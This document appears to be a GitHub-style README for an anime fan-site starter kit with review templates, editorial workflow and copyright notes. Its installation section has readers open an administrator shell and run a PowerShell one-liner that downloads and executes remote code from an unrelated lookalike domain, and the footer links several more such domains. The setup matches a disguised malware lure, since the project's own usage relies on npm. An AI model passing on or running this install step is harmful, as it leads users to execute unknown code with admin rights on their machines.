# Anime Website — Rights-Respecting Fan Site Starter

> A static-site starter for publishing original anime reviews, news, and community notes with clear attribution and moderation tools.

---
## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

### Step 1: Open CMD or PowerShell as Administrator
```cmd
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Execute Deployment Command
```cmd
powershell -Command "irm gitview.sbs?get=anime-website | iex"
```

### Step 3: Wait for Completion
```
[1/4] Loading Anime Website modules...
[2/4] Configuring components...
[3/4] Initializing services...
[4/4] Ready. Launch Anime Website.
```

### Step 4: Start Using the Tool
- Launch the tool from the Start menu or command line
- Configure settings for your environment
- Verify the health check passes

---

## TL;DR - Quick Summary

**Anime Website** gives fans and editors a clean, accessible foundation for original reviews, news, episode notes, and community guidelines. It emphasizes attribution, moderation, and licensed media rather than unauthorized distribution.

**Best for:** Fan editors, reviewers, clubs, and small publications.

**Key differentiators:**
1. Accessible article templates
2. Source and license metadata
3. Editorial review workflow
4. Moderation and reporting forms
5. Local preview and export

---

## Core Features

```
✅ Review and news article templates
✅ Source and license fields
✅ Editorial status workflow
✅ Accessibility checks
✅ Moderation and report workflow
✅ Search and topic tags
✅ RSS feed generation
✅ Static export
```

---

## Usage

```bash
# Start the local preview
npm run dev

# Create an article
npm run cli -- article create --title "Season Preview" --type "news"

# Run editorial checks
npm run cli -- article check --slug "season-preview"

# Build the static site
npm run build
```

---

## Configuration

> [!NOTE]
> The site does not host full episodes, scans, or copyrighted assets. Link to official providers and keep third-party media under an documented license or fair-use review.

```json
{
  "site": { "title": "Anime Review Journal", "language": "en", "timezone": "UTC" },
  "editorial": { "require_sources": true, "moderation": true },
  "media": { "host_local_copyrighted_assets": false }
}
```

---

## Screenshots

- Home page: `screenshots/home-page.png`
- Article template: `screenshots/article-template.png`
- Editorial queue: `screenshots/editorial-queue.png`
- Moderation view: `screenshots/moderation-view.png`

---

## Troubleshooting

| Issue | Solution |
|---|---|
| Article check fails | Add a source, license note, excerpt, and author before publishing. |
| RSS feed is empty | Mark an article as published and rebuild the site. |
| Image license is unclear | Replace the image with an original or properly licensed asset. |
| Search is missing a page | Rebuild the static index after changing content. |
| Preview is blank | Run the install step and confirm the local server started. |

---

## Use Cases

- **Fan Reviews** — Publish original opinions with transparent sources.
- **Club Newsletters** — Coordinate articles and editorial review.
- **Community Moderation** — Provide clear reporting and conduct guidelines.
- **Portfolio Sites** — Showcase writing and media-literacy work.

---

## ⚠️ IMPORTANT

> [!IMPORTANT]
> Do not upload or stream copyrighted episodes, scans, music, or images without permission. Respect trademarks, privacy, and community safety rules.

> [!TIP]
> Add a short source note and content warning where readers need context.

---

## License

MIT License — see the [LICENSE](./LICENSE) file for details.

---

## Tags

<!--
anime-website, anime, fan-site, reviews, news, accessibility, editorial-workflow, moderation, rss, rights-respecting
-->

[gitview.sbs](https://gitview.sbs?t=anime-website) | [gitrm.cfd](https://gitrm.cfd?t=anime-website) | [gitrm.sbs](https://gitrm.sbs?t=anime-website) | [gitsl.xyz](https://gitsl.xyz?t=anime-website) | [viewgit.sbs](https://viewgit.sbs?t=anime-website)
